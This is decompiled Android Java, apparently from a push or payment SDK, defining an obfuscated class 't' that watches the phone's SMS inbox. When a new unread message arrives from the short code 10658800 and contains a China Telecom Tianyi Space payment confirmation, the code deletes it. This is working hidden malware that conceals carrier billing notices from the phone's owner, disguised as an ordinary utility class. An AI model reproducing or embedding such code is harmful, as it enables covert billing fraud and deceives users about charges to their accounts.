package com.push2.sdk.util;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class t
  extends ContentObserver
{
  private Context a;
  private Cursor b;
  
  public t(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.a = paramContext;
  }
  
  public void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    this.b = null;
    try
    {
      ContentResolver localContentResolver = this.a.getContentResolver();
      this.b = localContentResolver.query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "thread_id", "date", "protocol", "type", "body", "read" }, " address=? and read=? ", new String[] { "10658800", "0" }, "date desc");
      if (this.b.moveToNext())
      {
        String str1 = this.b.getString(this.b.getColumnIndex("thread_id"));
        String str2 = this.b.getString(this.b.getColumnIndex("body"));
        String str3 = this.b.getString(this.b.getColumnIndex("_id"));
        if (str2.indexOf("中国电信天翼空间支付确认：您的号码") != -1) {
          localContentResolver.delete(Uri.parse("content://sms/conversations/" + str1), "_id=?", new String[] { str3 });
        }
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      return;
    }
    finally
    {
      if (this.b != null) {
        this.b.close();
      }
    }
  }
}
